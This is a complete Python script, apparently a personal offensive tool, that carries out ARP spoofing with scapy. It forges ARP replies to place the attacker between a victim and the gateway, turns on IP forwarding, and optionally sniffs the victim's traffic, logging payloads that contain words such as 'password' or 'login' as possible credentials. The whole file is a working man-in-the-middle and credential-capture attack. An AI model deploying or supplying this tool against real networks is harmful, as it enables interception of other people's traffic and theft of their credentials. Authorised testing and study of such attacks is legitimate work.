#!/usr/bin/env python3

import scapy.all as scapy
import time
import argparse
import os
import sys
import logging

def enable_ip_forwarding():
    if os.name != "posix":
        print("IP forwarding enabling only supported on Linux.")
        return
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")
    logging.info("IP Forwarding enabled.")

def disable_ip_forwarding():
    if os.name != "posix":
        return
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("0")
    logging.info("IP Forwarding disabled.")

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request
    answered = scapy.srp(packet, timeout=2, verbose=False)[0]
    if answered:
        return answered[0][1].hwsrc
    else:
        logging.warning(f"No response from {ip}. MAC address not found.")
        return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        return
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    if not dst_mac or not src_mac:
        return
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)
    logging.info(f"Restored ARP table for {dst_ip} and {src_ip}")

def sniff_packets(interface, victim_ip):
    logging.info(f"[*] Starting packet sniffer on {interface} filtering {victim_ip}")
    def process_packet(packet):
        if packet.haslayer(scapy.Raw):
            payload = packet[scapy.Raw].load
            try:
                payload_text = payload.decode(errors="ignore")
                # Very basic credential detection for HTTP POST
                keywords = ["password", "login", "user", "username", "pass"]
                if any(keyword in payload_text.lower() for keyword in keywords):
                    logging.warning(f"[!!] Possible credential sniffed:\n{payload_text}\n")
            except Exception:
                pass
    scapy.sniff(iface=interface, prn=process_packet, store=False, filter=f"ip host {victim_ip}")

def main():
    parser = argparse.ArgumentParser(description="Professional ARP Spoofing Tool by Cybernerddd")
    parser.add_argument("-t", "--target", required=True, help="Target IP address (victim)")
    parser.add_argument("-g", "--gateway", required=True, help="Default Gateway IP")
    parser.add_argument("-i", "--interface", required=True, help="Network interface (e.g., eth0, wlan0)")
    parser.add_argument("-s", "--sniff", action="store_true", help="Sniff packets for credentials")
    parser.add_argument("--interval", type=int, default=2, help="Spoofing interval in seconds (default: 2)")
    args = parser.parse_args()

    logging.basicConfig(format='%(asctime)s - %(levelname)s: %(message)s', level=logging.INFO)

    if os.geteuid() != 0:
        logging.critical("Run as root!")
        sys.exit(1)

    enable_ip_forwarding()

    try:
        if args.sniff:
            from threading import Thread
            sniffer_thread = Thread(target=sniff_packets, args=(args.interface, args.target), daemon=True)
            sniffer_thread.start()

        logging.info(f"[*] Starting ARP spoofing on {args.target} <-> {args.gateway}")
        packet_count = 0
        while True:
            spoof(args.target, args.gateway)
            spoof(args.gateway, args.target)
            packet_count += 2
            print(f"\r[+] Sent Packets: {packet_count}", end="", flush=True)
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print("\n[-] CTRL+C detected. Restoring ARP tables...")
        restore(args.target, args.gateway)
        restore(args.gateway, args.target)
        disable_ip_forwarding()
        logging.info("ARP spoofing stopped and targets restored.")

if __name__ == "__main__":
    main()
